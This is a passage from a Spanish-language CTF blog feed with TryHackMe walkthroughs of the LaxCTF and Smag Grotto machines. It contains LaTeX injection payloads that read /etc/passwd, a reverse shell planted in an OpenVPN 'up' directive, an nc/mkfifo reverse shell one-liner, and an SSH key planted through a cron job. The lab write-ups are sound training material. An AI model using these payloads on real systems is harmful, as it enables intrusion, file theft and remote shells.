&lt;span class=&#34;se&#34;&gt;\o&lt;/span&gt;penin&lt;span class=&#34;se&#34;&gt;\f&lt;/span&gt;ile&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/etc/passwd
&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;ead&lt;span class=&#34;se&#34;&gt;\f&lt;/span&gt;ile to&lt;span class=&#34;se&#34;&gt;\l&lt;/span&gt;ine
&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ext&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\l&lt;/span&gt;ine&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;se&#34;&gt;\c&lt;/span&gt;losein&lt;span class=&#34;se&#34;&gt;\f&lt;/span&gt;ile
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/laxctf/Screenshot_20200729_191346.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Intentamos utilizar el mismo payload que utilizamos en &lt;a href=&#34;https://sckull.github.io/posts/chaos/&#34;&gt;&lt;strong&gt;CHAOS - HTB&lt;/strong&gt;&lt;/a&gt; pero al parecer tiene un blacklist parecido a este:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;(input|include|write18|immediate)&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Por lo que no es posible utilizar los &amp;ldquo;comandos&amp;rdquo; conocidos. Probamos diferentes combinaciones pero ninguna de estas combinaciones funcionó. Reallizamos una busqueda de un posible &lt;code&gt;exploit&lt;/code&gt; en google y encontramos un PoC en &lt;a href=&#34;https://www.exploit-db.com/exploits/8297&#34;&gt;&lt;strong&gt;Moodle &amp;lt; 1.6.9/1.7.7/1.8.9/1.9.5 - File Disclosure&lt;/strong&gt;&lt;/a&gt; donde indica como es posible leer archivos a traves del siguiente payload:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$$&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; \input{/etc/passwd} &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$$&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/laxctf/Screenshot_20200803_223810.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Logramos leer el archivo e incrustarlo en el PDF:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/laxctf/Screenshot_20200729_191439.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Además, dentro de la respuesta al enviar el PoC encontramos el contenido del archivo &lt;code&gt;/etc/passwd&lt;/code&gt; con la informacion desordenada, donde logramos ver uno de los usuarios con su directorio principal y una carpeta no muy comun dentro de este archivo. Uno de los usuarios es &lt;code&gt;Lax&lt;/code&gt; o &lt;code&gt;king&lt;/code&gt; (Lax puede referirse al hostname) y su carpeta principal se encuentra en &lt;code&gt;/home/king&lt;/code&gt;, el otro directorio es &lt;code&gt;/opt/secret&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/laxctf/Screenshot_20200729_192158.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizando el directorio principal del usuario que encontramos podemos leer nuestra flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$$&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; \input{/home/king/user.txt} &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$$&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/laxctf/Screenshot_20200729_192353.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Hicimos lo mismo con &lt;code&gt;/opt/secret&lt;/code&gt; pero a un principio no tenia nada en su interior, pero al inspeccionar el codigo fuente encontramos strings separadas por etiquetas HTML.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/laxctf/Screenshot_20200729_194418.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos &lt;a href=&#34;https://www.browserling.com/tools/html-strip&#34;&gt;&lt;strong&gt;HTML-strip&lt;/strong&gt;&lt;/a&gt; para poder eliminar las etiquetas y obtener el texto completo, además eliminamos todos los espacios existentes y caracteres al inicio y al final &lt;code&gt;&amp;quot; y 1&lt;/code&gt;. Logramos leer lo que parece una encriptacion &lt;code&gt;AES en modo CBC&lt;/code&gt; pero para obtener el texto necesitamos KEY e IV.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;AES/CBC/128d2X+7fLZAq4as9qs7yGRdWANgbFVDaly2j2TjnKbeCq8bH3iR2XpyXBVjSCsrGLmTAhyffVoOgbhmVl5vDDMNvC6wJNfEZWa+MkF8HGQBcrE9pYSHag8jxC4vFwyINMOq53YR2GXUZFvA/qipjUStx3N69Wc7f3QpDVKRmGudEPhw0AMnnbICAvCNPoXIdyOK3I2zKM+za8z7+7V6Ut5gWCKQezKa+l91GNQWj1iUKU0rlzTmr49Fkcwlw01E0tr3DqQv8BV0V3eCs7mRnUCzdW4tnRH9J9eP7likT
[... REDACTED ...]
g9bmi7WpLL/+UMWNYMetCj52lDgLyisn9B+0/W0/Tfd7qn5SLILAVrMICIYIfVWWsELCTIYTuLEpdo+HVAfxfh8RB3pZ3cG+uzCe1xSMcx0JfSld1Hfa3hJK75zVWwcfu4EvVZ1ghlZwtm7Ls=
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;king---user&#34;&gt;KING - USER&lt;/h2&gt;
&lt;h3 id=&#34;apk&#34;&gt;APK&lt;/h3&gt;
&lt;p&gt;Encontramos un apk en &lt;code&gt;/Google-Earth/&lt;/code&gt; y utilizamos &lt;a href=&#34;https://github.com/skylot/jadx&#34;&gt;&lt;code&gt;jadx&lt;/code&gt;&lt;/a&gt; para leer el codigo fuente de la aplicacion, en donde encontramos funciones para encriptar y desencriptar, además encontramos el IV y KEY.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/laxctf/Screenshot_20200729_202131.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos &lt;a href=&#34;https://gchq.github.io/CyberChef/&#34;&gt;&lt;strong&gt;CyberChef&lt;/strong&gt;&lt;/a&gt; para desencriptar el texto (eliminamos AES/CBC/128).&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/laxctf/Screenshot_20200729_202658.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;El texto esta codificado en &lt;code&gt;brainfuck&lt;/code&gt;, utilizamos &lt;a href=&#34;https://www.dcode.fr/brainfuck-language&#34;&gt;&lt;strong&gt;dcode.fr&lt;/strong&gt;&lt;/a&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/laxctf/Screenshot_20200729_202829.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Nuevamente utilizamos CyberChef para obtener lo que parecen credenciales del usuario &lt;code&gt;king&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/laxctf/Screenshot_20200729_202959.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Logramos obtener una shell con el usuario King.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/laxctf/Screenshot_20200729_203111.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Hacemos una pequeña enumeracion con &lt;code&gt;pspy&lt;/code&gt; y encontramos que se ejecuta un cron, el problema es de que no sabemos cual es el contenido de dicho archivo (&lt;code&gt;run.sh&lt;/code&gt;).&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/laxctf/Screenshot_20200729_204315.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En el directorio principal de &lt;code&gt;king&lt;/code&gt; encontramos un archivo &lt;code&gt;ovpn&lt;/code&gt; por lo que agregamos una shell inversa al igual que en &lt;a href=&#34;https://sckull.github.io/posts/vault/&#34;&gt;&lt;strong&gt;VAULT - HTB&lt;/strong&gt;&lt;/a&gt; esperando a alguna conexion a nuestra maquina.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;remote 10.10.90.68
dev tun
nobind
script-security &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
up &lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.1/1338 0&amp;gt;&amp;amp;1&amp;#39;&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Logramos obtener una shell con usuario root y nuestra flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/laxctf/Screenshot_20200729_205844.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Revisamos el archivo &lt;code&gt;run.sh&lt;/code&gt; y es el que ejecutó el archivo ovpn.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;openvpn /home/king/tryhackme.ovpn
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection&#34;&gt;&lt;strong&gt;Payloads - Latex Injection&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/laxctf/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/laxctf/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Smag Grotto</title>
        <link>https://sckull.github.io/posts/smag/</link>
        <pubDate>Wed, 29 Jul 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Wed, 29 Jul 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/smag/</guid>
        <description>Smag Grotto es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.</description>
        <content:encoded>&lt;p&gt;Smag Grotto es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/smag/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Smag Grotto&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Do you remember how to analyse packets?&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;160&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/JakeDoesSec&#34;&gt;JakeDoesSec&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto smb (445), ldap (139) y el puerto ssh (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Wed Jul 29 17:29:14 2020 as: nmap -sV -o nmap_scan_mini smag.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; smag.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.138.62&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.26s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;998&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.18 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed Jul 29 17:29:58 2020 -- 1 IP address (1 host up) scanned in 44.14 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina web en el puerto 80.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/smag/Screenshot_20200729_163109.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h3&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/smag# gobuster dir -u http://smag.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/mail &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;www-data---user&#34;&gt;WWW-DATA - USER&lt;/h2&gt;
&lt;p&gt;Encontramos la pagina &lt;code&gt;/mail&lt;/code&gt; donde vemos algunos correos, en uno de ellos un archivo &lt;code&gt;pcap&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/smag/Screenshot_20200729_163411.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Analizamos el archivo y encontramos credenciales, además de ello un subdominio.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;POST /login.php HTTP/1.1
Host: development.smag.thm
User-Agent: curl/7.47.0
Accept: */*
Content-Length: &lt;span class=&#34;m&#34;&gt;39&lt;/span&gt;
Content-Type: application/x-www-form-urlencoded

&lt;span class=&#34;nv&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;help&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;cH4nG3M3_&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;HTTP/1.1 &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK
Date: Wed, &lt;span class=&#34;m&#34;&gt;03&lt;/span&gt; Jun &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; 18:04:07 GMT
Server: Apache/2.4.18 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Content-Length: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
Content-Type: text/html&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;UTF-8
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Agregamos el subdominio en nuestro archivo &lt;code&gt;/etc/hosts&lt;/code&gt;. Visitamos el puerto 80 y encontramos archivos css y php.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/smag/Screenshot_20200729_164759.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos las credenciales en el panel de &lt;code&gt;login.php&lt;/code&gt; donde logramos obtener acceso a una pagina para ingresar comandos.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/smag/Screenshot_20200729_165136.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Enviamos un ping hacia nuestra maquina y logramos obtener paquetes desde la maquina (&lt;code&gt;smag.thm&lt;/code&gt;).&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/smag/Screenshot_20200729_170001.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ejecutamos la siguiente shell inversa con nuestra IP y PUERTO para obtener una shell con el usuario &lt;code&gt;www-data&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;rm /tmp/f&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;mkfifo /tmp/f&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;cat /tmp/f&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;/bin/sh -i 2&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;1&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;nc 10.0.0.0 &lt;span class=&#34;m&#34;&gt;1338&lt;/span&gt; &amp;gt;/tmp/f
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/smag/Screenshot_20200729_170352.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;user---jake&#34;&gt;USER - JAKE&lt;/h2&gt;
&lt;p&gt;Dentro de la maquina, enumeramos los directorios, en &lt;code&gt;/opt/&lt;/code&gt; encontramos un directorio con un archivo que contiene la clave publica (&lt;code&gt;id_rsa.pub&lt;/code&gt;) del usuario jake.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/smag/Screenshot_20200729_171307.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Revisamos los crons de la maquina y encontramos que el contenido de este ultimo archivo se agrega al archivo &lt;code&gt;authorized_keys&lt;/code&gt; del usuario &lt;code&gt;jake&lt;/code&gt;, por lo que podemos agregar nuestra clave publica al archivo &lt;code&gt;/opt/.backups/jake_id_rsa.pub.backup&lt;/code&gt; para poder ingresar en el servicio SSH utilizando el usuario Jake.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.ssh.com/ssh/authorized_keys/&#34;&gt;&lt;strong&gt;Authorized_Keys - SSH&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/smag/Screenshot_20200729_171611.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Agregamos nuestra clave publica y esperamos hasta que se agregue en el archivo de Jake.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/smag/Screenshot_20200729_171746.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ingresamos con el usuario Jake en SSH sin ninguna contraseña, y logramos obtener una shell y nuestra flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;br /&gt;
